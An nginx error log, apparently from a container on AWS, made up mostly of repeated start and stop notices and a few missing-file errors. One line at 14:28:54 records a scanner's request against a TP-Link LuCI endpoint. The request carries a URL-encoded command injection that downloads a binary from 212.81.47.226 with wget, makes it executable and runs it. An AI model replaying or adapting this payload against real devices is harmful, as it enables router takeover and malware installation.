2025/05/26 09:16:41 [notice] 1#1: using the "epoll" event method
2025/05/26 09:16:41 [notice] 1#1: nginx/1.27.5
2025/05/26 09:16:41 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 09:16:41 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 09:16:41 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 09:16:41 [notice] 1#1: start worker processes
2025/05/26 09:16:41 [notice] 1#1: start worker process 30
2025/05/26 09:17:08 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 09:17:08 [notice] 30#30: gracefully shutting down
2025/05/26 09:17:08 [notice] 30#30: exiting
2025/05/26 09:17:08 [notice] 30#30: exit
2025/05/26 09:17:09 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 09:17:09 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 09:17:09 [notice] 1#1: exit
2025/05/26 09:18:01 [notice] 1#1: using the "epoll" event method
2025/05/26 09:18:01 [notice] 1#1: nginx/1.27.5
2025/05/26 09:18:01 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 09:18:01 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 09:18:01 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 09:18:01 [notice] 1#1: start worker processes
2025/05/26 09:18:01 [notice] 1#1: start worker process 30
2025/05/26 09:18:36 [error] 30#30: *2 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 37.214.66.34, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "3.93.148.2:8080", referrer: "http://3.93.148.2:8080/"
2025/05/26 09:25:48 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 09:25:48 [notice] 30#30: gracefully shutting down
2025/05/26 09:25:48 [notice] 30#30: exiting
2025/05/26 09:25:48 [notice] 30#30: exit
2025/05/26 09:25:48 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 09:25:48 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 09:25:48 [notice] 1#1: exit
2025/05/26 11:41:23 [notice] 1#1: using the "epoll" event method
2025/05/26 11:41:23 [notice] 1#1: nginx/1.27.5
2025/05/26 11:41:23 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 11:41:23 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 11:41:23 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 11:41:23 [notice] 1#1: start worker processes
2025/05/26 11:41:23 [notice] 1#1: start worker process 30
2025/05/26 11:43:35 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 11:43:35 [notice] 30#30: gracefully shutting down
2025/05/26 11:43:35 [notice] 30#30: exiting
2025/05/26 11:43:35 [notice] 30#30: exit
2025/05/26 11:43:35 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 11:43:35 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 11:43:35 [notice] 1#1: exit
2025/05/26 11:47:14 [notice] 1#1: using the "epoll" event method
2025/05/26 11:47:14 [notice] 1#1: nginx/1.27.5
2025/05/26 11:47:14 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 11:47:14 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 11:47:14 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 11:47:14 [notice] 1#1: start worker processes
2025/05/26 11:47:14 [notice] 1#1: start worker process 30
2025/05/26 11:48:58 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 11:48:58 [notice] 30#30: gracefully shutting down
2025/05/26 11:48:58 [notice] 30#30: exiting
2025/05/26 11:48:58 [notice] 30#30: exit
2025/05/26 11:48:58 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 11:48:58 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 11:48:58 [notice] 1#1: exit
2025/05/26 11:49:07 [notice] 1#1: using the "epoll" event method
2025/05/26 11:49:07 [notice] 1#1: nginx/1.27.5
2025/05/26 11:49:07 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 11:49:07 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 11:49:07 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 11:49:07 [notice] 1#1: start worker processes
2025/05/26 11:49:07 [notice] 1#1: start worker process 30
2025/05/26 11:56:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 11:56:54 [notice] 30#30: gracefully shutting down
2025/05/26 11:56:54 [notice] 30#30: exiting
2025/05/26 11:56:54 [notice] 30#30: exit
2025/05/26 11:56:54 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 11:56:54 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 11:56:54 [notice] 1#1: exit
2025/05/26 12:01:45 [notice] 1#1: using the "epoll" event method
2025/05/26 12:01:45 [notice] 1#1: nginx/1.27.5
2025/05/26 12:01:45 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 12:01:45 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 12:01:45 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 12:01:45 [notice] 1#1: start worker processes
2025/05/26 12:01:45 [notice] 1#1: start worker process 30
2025/05/26 12:29:12 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 12:29:12 [notice] 30#30: gracefully shutting down
2025/05/26 12:29:12 [notice] 30#30: exiting
2025/05/26 12:29:12 [notice] 30#30: exit
2025/05/26 12:29:12 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 12:29:12 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 12:29:12 [notice] 1#1: exit
2025/05/26 12:29:34 [notice] 1#1: using the "epoll" event method
2025/05/26 12:29:34 [notice] 1#1: nginx/1.27.5
2025/05/26 12:29:34 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 12:29:34 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 12:29:34 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 12:29:34 [notice] 1#1: start worker processes
2025/05/26 12:29:34 [notice] 1#1: start worker process 30
2025/05/26 12:32:39 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 12:32:39 [notice] 30#30: gracefully shutting down
2025/05/26 12:32:39 [notice] 30#30: exiting
2025/05/26 12:32:39 [notice] 30#30: exit
2025/05/26 12:32:39 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 12:32:39 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 12:32:39 [notice] 1#1: exit
2025/05/26 12:32:52 [notice] 1#1: using the "epoll" event method
2025/05/26 12:32:52 [notice] 1#1: nginx/1.27.5
2025/05/26 12:32:52 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 12:32:52 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 12:32:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 12:32:52 [notice] 1#1: start worker processes
2025/05/26 12:32:52 [notice] 1#1: start worker process 30
2025/05/26 12:38:46 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 12:38:46 [notice] 30#30: gracefully shutting down
2025/05/26 12:38:46 [notice] 30#30: exiting
2025/05/26 12:38:46 [notice] 30#30: exit
2025/05/26 12:38:46 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 12:38:46 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 12:38:46 [notice] 1#1: exit
2025/05/26 12:38:54 [notice] 1#1: using the "epoll" event method
2025/05/26 12:38:54 [notice] 1#1: nginx/1.27.5
2025/05/26 12:38:54 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 12:38:54 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 12:38:54 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 12:38:54 [notice] 1#1: start worker processes
2025/05/26 12:38:54 [notice] 1#1: start worker process 30
2025/05/26 12:48:34 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 12:48:34 [notice] 30#30: gracefully shutting down
2025/05/26 12:48:34 [notice] 30#30: exiting
2025/05/26 12:48:34 [notice] 30#30: exit
2025/05/26 12:48:34 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 12:48:34 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 12:48:34 [notice] 1#1: exit
2025/05/26 12:48:41 [notice] 1#1: using the "epoll" event method
2025/05/26 12:48:41 [notice] 1#1: nginx/1.27.5
2025/05/26 12:48:41 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 12:48:41 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 12:48:41 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 12:48:41 [notice] 1#1: start worker processes
2025/05/26 12:48:41 [notice] 1#1: start worker process 29
2025/05/26 12:50:51 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 12:50:51 [notice] 29#29: gracefully shutting down
2025/05/26 12:50:51 [notice] 29#29: exiting
2025/05/26 12:50:51 [notice] 29#29: exit
2025/05/26 12:50:51 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2025/05/26 12:50:51 [notice] 1#1: worker process 29 exited with code 0
2025/05/26 12:50:51 [notice] 1#1: exit
2025/05/26 12:50:59 [notice] 1#1: using the "epoll" event method
2025/05/26 12:50:59 [notice] 1#1: nginx/1.27.5
2025/05/26 12:50:59 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 12:50:59 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 12:50:59 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 12:50:59 [notice] 1#1: start worker processes
2025/05/26 12:50:59 [notice] 1#1: start worker process 30
2025/05/26 12:59:02 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 12:59:02 [notice] 30#30: gracefully shutting down
2025/05/26 12:59:02 [notice] 30#30: exiting
2025/05/26 12:59:02 [notice] 30#30: exit
2025/05/26 12:59:02 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 12:59:02 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 12:59:02 [notice] 1#1: exit
2025/05/26 14:26:17 [notice] 1#1: using the "epoll" event method
2025/05/26 14:26:17 [notice] 1#1: nginx/1.27.5
2025/05/26 14:26:17 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 14:26:17 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 14:26:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 14:26:17 [notice] 1#1: start worker processes
2025/05/26 14:26:17 [notice] 1#1: start worker process 30
2025/05/26 14:28:54 [error] 30#30: *1 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 141.98.11.137, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F212.81.47.226%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1", host: "54.243.14.235:8080"
2025/05/26 14:29:20 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 14:29:20 [notice] 30#30: gracefully shutting down
2025/05/26 14:29:20 [notice] 30#30: exiting
2025/05/26 14:29:20 [notice] 30#30: exit
2025/05/26 14:29:20 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 14:29:20 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 14:29:20 [notice] 1#1: exit
2025/05/26 14:29:27 [notice] 1#1: using the "epoll" event method
2025/05/26 14:29:27 [notice] 1#1: nginx/1.27.5
2025/05/26 14:29:27 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 14:29:27 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 14:29:27 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 14:29:27 [notice] 1#1: start worker processes
2025/05/26 14:29:27 [notice] 1#1: start worker process 30
2025/05/26 14:32:18 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 14:32:18 [notice] 30#30: gracefully shutting down
2025/05/26 14:32:18 [notice] 30#30: exiting
2025/05/26 14:32:18 [notice] 30#30: exit
2025/05/26 14:32:18 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 14:32:18 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 14:32:18 [notice] 1#1: exit
2025/05/26 14:35:32 [notice] 1#1: using the "epoll" event method
2025/05/26 14:35:32 [notice] 1#1: nginx/1.27.5
2025/05/26 14:35:32 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 14:35:32 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 14:35:32 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 14:35:32 [notice] 1#1: start worker processes
2025/05/26 14:35:32 [notice] 1#1: start worker process 30
2025/05/26 14:38:47 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 14:38:47 [notice] 30#30: gracefully shutting down
2025/05/26 14:38:47 [notice] 30#30: exiting
2025/05/26 14:38:47 [notice] 30#30: exit
2025/05/26 14:38:47 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 14:38:47 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 14:38:47 [notice] 1#1: exit
2025/05/26 14:38:54 [notice] 1#1: using the "epoll" event method
2025/05/26 14:38:54 [notice] 1#1: nginx/1.27.5
2025/05/26 14:38:54 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 14:38:54 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 14:38:54 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 14:38:54 [notice] 1#1: start worker processes
2025/05/26 14:38:54 [notice] 1#1: start worker process 30
2025/05/26 14:39:17 [error] 30#30: *2 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 46.216.175.60, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "54.243.14.235:8080", referrer: "http://54.243.14.235:8080/"
2025/05/26 14:41:31 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 14:41:31 [notice] 30#30: gracefully shutting down
2025/05/26 14:41:31 [notice] 30#30: exiting
2025/05/26 14:41:31 [notice] 30#30: exit
2025/05/26 14:41:31 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 14:41:31 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 14:41:31 [notice] 1#1: exit
2025/05/26 17:54:34 [notice] 1#1: using the "epoll" event method
2025/05/26 17:54:34 [notice] 1#1: nginx/1.27.5
2025/05/26 17:54:34 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 17:54:34 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 17:54:34 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 17:54:34 [notice] 1#1: start worker processes
2025/05/26 17:54:34 [notice] 1#1: start worker process 30
2025/05/26 18:06:27 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 18:06:27 [notice] 30#30: gracefully shutting down
2025/05/26 18:06:27 [notice] 30#30: exiting
2025/05/26 18:06:27 [notice] 30#30: exit
2025/05/26 18:06:27 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 18:06:27 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 18:06:27 [notice] 1#1: exit
2025/05/26 18:06:44 [notice] 1#1: using the "epoll" event method
2025/05/26 18:06:44 [notice] 1#1: nginx/1.27.5
2025/05/26 18:06:44 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 18:06:44 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 18:06:44 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 18:06:44 [notice] 1#1: start worker processes
2025/05/26 18:06:44 [notice] 1#1: start worker process 30
2025/05/26 18:11:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 18:11:53 [notice] 30#30: gracefully shutting down
2025/05/26 18:11:53 [notice] 30#30: exiting
2025/05/26 18:11:53 [notice] 30#30: exit
2025/05/26 18:11:53 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 18:11:53 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 18:11:53 [notice] 1#1: exit
2025/05/26 18:12:00 [notice] 1#1: using the "epoll" event method
2025/05/26 18:12:00 [notice] 1#1: nginx/1.27.5
2025/05/26 18:12:00 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 18:12:00 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 18:12:00 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 18:12:00 [notice] 1#1: start worker processes
2025/05/26 18:12:00 [notice] 1#1: start worker process 30
2025/05/26 18:15:00 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 18:15:00 [notice] 30#30: gracefully shutting down
2025/05/26 18:15:00 [notice] 30#30: exiting
2025/05/26 18:15:00 [notice] 30#30: exit
2025/05/26 18:15:00 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 18:15:00 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 18:15:00 [notice] 1#1: exit
2025/05/26 18:15:07 [notice] 1#1: using the "epoll" event method
2025/05/26 18:15:07 [notice] 1#1: nginx/1.27.5
2025/05/26 18:15:07 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 18:15:07 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 18:15:07 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 18:15:07 [notice] 1#1: start worker processes
2025/05/26 18:15:07 [notice] 1#1: start worker process 29
2025/05/26 18:16:12 [error] 29#29: *2 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 38.248.91.39, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "3.83.110.141:8080", referrer: "http://3.83.110.141:8080/"
2025/05/26 18:16:34 [error] 29#29: *3 open() "/usr/share/nginx/html/1" failed (2: No such file or directory), client: 38.248.91.39, server: localhost, request: "GET /1 HTTP/1.1", host: "3.83.110.141:8080"
2025/05/26 19:30:46 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 19:30:46 [notice] 29#29: gracefully shutting down
2025/05/26 19:30:46 [notice] 29#29: exiting
2025/05/26 19:30:46 [notice] 29#29: exit
2025/05/26 19:30:46 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2025/05/26 19:30:46 [notice] 1#1: worker process 29 exited with code 0
2025/05/26 19:30:46 [notice] 1#1: exit
2025/05/26 19:30:54 [notice] 1#1: using the "epoll" event method
2025/05/26 19:30:54 [notice] 1#1: nginx/1.27.5
2025/05/26 19:30:54 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 19:30:54 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 19:30:54 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 19:30:54 [notice] 1#1: start worker processes
2025/05/26 19:30:54 [notice] 1#1: start worker process 30
2025/05/26 19:49:17 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 19:49:17 [notice] 30#30: gracefully shutting down
2025/05/26 19:49:17 [notice] 30#30: exiting
2025/05/26 19:49:17 [notice] 30#30: exit
2025/05/26 19:49:17 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 19:49:17 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 19:49:17 [notice] 1#1: exit
2025/05/26 19:50:00 [notice] 1#1: using the "epoll" event method
2025/05/26 19:50:00 [notice] 1#1: nginx/1.27.5
2025/05/26 19:50:00 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/26 19:50:00 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/26 19:50:00 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/26 19:50:00 [notice] 1#1: start worker processes
2025/05/26 19:50:00 [notice] 1#1: start worker process 30
2025/05/26 22:04:35 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2025/05/26 22:04:35 [notice] 30#30: gracefully shutting down
2025/05/26 22:04:35 [notice] 30#30: exiting
2025/05/26 22:04:35 [notice] 30#30: exit
2025/05/26 22:04:35 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2025/05/26 22:04:35 [notice] 1#1: worker process 30 exited with code 0
2025/05/26 22:04:35 [notice] 1#1: exit
2025/05/27 04:37:01 [notice] 1#1: using the "epoll" event method
2025/05/27 04:37:01 [notice] 1#1: nginx/1.27.5
2025/05/27 04:37:01 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
2025/05/27 04:37:01 [notice] 1#1: OS: Linux 6.8.0-1029-aws
2025/05/27 04:37:01 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2025/05/27 04:37:01 [notice] 1#1: start worker processes
2025/05/27 04:37:01 [notice] 1#1: start worker process 29
